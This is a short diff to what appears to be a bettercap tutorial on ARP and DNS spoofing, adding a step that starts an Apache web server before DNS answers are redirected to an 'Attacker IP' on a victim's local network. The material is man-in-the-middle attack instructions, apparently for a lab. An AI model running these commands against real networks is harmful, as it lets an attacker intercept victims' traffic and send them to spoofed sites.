@@ -19,8 +19,14 @@ set arp.spoof.targets 192.168.229.132 (Victim IP)
 
 --------------
 
-## Step 2 : Starting dns spoofing 
+## Step 2 : Start apache on 
 
+```
+sudo systemctl start apache2 
+```
+
+------------
+## Step 3 : Starting dns spoofing 
 
 ```
 set dns.spoof.address 192.168.229.131 (Attacker IP)
